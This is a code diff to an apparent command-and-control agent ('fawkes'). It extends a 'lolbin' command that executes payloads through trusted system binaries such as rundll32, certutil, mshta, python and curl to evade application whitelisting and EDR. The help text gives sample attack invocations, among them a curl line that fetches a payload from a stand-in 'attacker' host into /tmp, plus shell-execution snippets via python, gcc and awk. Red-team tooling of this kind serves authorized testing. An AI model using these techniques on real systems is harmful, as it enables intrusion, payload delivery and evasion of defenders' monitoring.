@@ -9,11 +9,11 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "lolbin",
-		Description:         "LOLBin/GTFOBin proxy execution — execute payloads through legitimate system binaries to bypass application whitelisting and EDR. Windows: rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil. Linux: python, curl, wget, gcc, perl, ruby, node, awk. macOS: osascript, swift, open, python, curl.",
+		Description:         "LOLBin/GTFOBin proxy execution — execute payloads through legitimate system binaries to bypass application whitelisting and EDR. Windows: rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil, vbs. Cross-platform: python, lua, perl, ruby, node, awk. Linux: curl, wget, gcc. macOS: osascript, swift, open, curl.",
 		HelpString:          "# Windows\nlolbin -action rundll32 -path C:\\payload.dll -export DllMain\nlolbin -action certutil -path C:\\encoded.b64\n# Linux (GTFOBins)\nlolbin -action python -path 'import os; os.system(\"id\")'\nlolbin -action curl -path http://attacker/payload -args '-o /tmp/p'\nlolbin -action gcc -path '#include <stdlib.h>\\nint main(){system(\"id\");return 0;}'\nlolbin -action awk -path 'BEGIN{system(\"id\")}'\n# macOS\nlolbin -action osascript -path 'display dialog \"Hello\"'\nlolbin -action swift -path 'import Foundation; print(\"Hello\")'",
 		Version:             3,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1218", "T1218.011", "T1218.007", "T1218.009", "T1218.005", "T1218.010", "T1218.004", "T1059", "T1059.002", "T1059.006", "T1059.007", "T1105", "T1027.004"},
+		MitreAttackMappings: []string{"T1218", "T1218.011", "T1218.007", "T1218.009", "T1218.005", "T1218.010", "T1218.004", "T1059", "T1059.002", "T1059.005", "T1059.006", "T1059.007", "T1105", "T1027.004"},
 		SupportedUIFeatures: []string{},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
@@ -28,8 +28,8 @@ func init() {
 				Name:          "action",
 				CLIName:       "action",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:       []string{"rundll32", "msiexec", "regsvcs", "regasm", "mshta", "certutil", "regsvr32", "installutil", "python", "curl", "wget", "gcc", "perl", "ruby", "node", "awk", "osascript", "swift", "open"},
-				Description:   "LOLBin/GTFOBin technique. Windows: rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil. Linux: python, curl, wget, gcc, perl, ruby, node, awk. macOS: osascript, swift, open, python, curl.",
+				Choices:       []string{"rundll32", "msiexec", "regsvcs", "regasm", "mshta", "certutil", "regsvr32", "installutil", "vbs", "lua", "python", "curl", "wget", "gcc", "perl", "ruby", "node", "awk", "osascript", "swift", "open"},
+				Description:   "LOLBin/GTFOBin technique. Windows: rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil, vbs. Cross-platform: python, lua, perl, ruby, node, awk. Linux: curl, wget, gcc. macOS: osascript, swift, open, curl.",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: true,
